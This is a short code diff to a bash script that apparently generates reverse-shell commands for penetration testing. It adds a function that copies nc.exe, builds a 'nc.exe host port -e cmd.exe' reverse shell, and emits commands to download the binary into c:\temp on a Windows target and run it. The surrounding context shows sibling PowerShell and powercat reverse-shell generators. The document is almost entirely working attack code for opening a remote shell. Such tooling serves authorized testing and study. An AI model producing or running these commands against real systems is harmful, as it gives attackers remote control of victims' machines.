@@ -181,6 +181,20 @@ get_powershell_reverse_shell_cmd() {
     echo $(encode_powershell "$reverse_shell")
 }
 
+get_nc_exe_reverse_shell() {
+    cp /usr/share/windows-resources/binaries/nc.exe .
+    local reverse_shell="nc.exe ${host_ip} ${host_port} -e cmd.exe"
+    if [[ ! -z $reverse_type ]] && [[ $reverse_type == "minimal" ]]; then
+        echo "$reverse_shell"
+        return 0
+    
+    else 
+        echo "cd c:\\temp;"
+        generate_windows_download "nc.exe" "c:\\temp\\nc.exe"
+        echo "c:\\temp\\$reverse_shell"    
+    fi
+}
+
 get_powercat_reverse_shell() {
     if [ ! -z "$1" ]; then
         host_port=$1
